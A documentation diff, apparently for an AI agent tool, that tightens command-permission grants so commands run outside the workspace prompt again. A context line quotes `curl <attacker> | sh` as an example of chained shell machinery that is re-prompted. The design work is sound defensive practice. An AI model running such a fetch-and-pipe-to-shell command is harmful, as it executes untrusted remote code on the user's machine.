@@ -207,6 +207,8 @@ Widening is offered **only** for a single plain invocation. Anything carrying sh
 
 Grants are session-scoped (`internal/session.State.PermissionCommandGrants`). Matching is deliberately stricter than for the operator-authored `tools.command_allowlist`: a session grant only ever covers a candidate command that is itself a single plain invocation. Trailing arguments stay covered, as they always were, but appending shell machinery does not — `curl <attacker> | sh` asks again even with a `curl` grant. The operator's own `tools.command_allowlist` keeps its documented prefix meaning.
 
+A grant approves a command, not the directory it runs in. A `run_command` whose `cwd` leaves the workspace (an absolute path elsewhere, or a relative one that climbs out with `..`) asks again even when its command is granted or allowlisted, and the prompt names that directory. Under `bypass` nothing asks, as before.
+
 ## HTTP surface
 
 | Method | Path | Purpose |
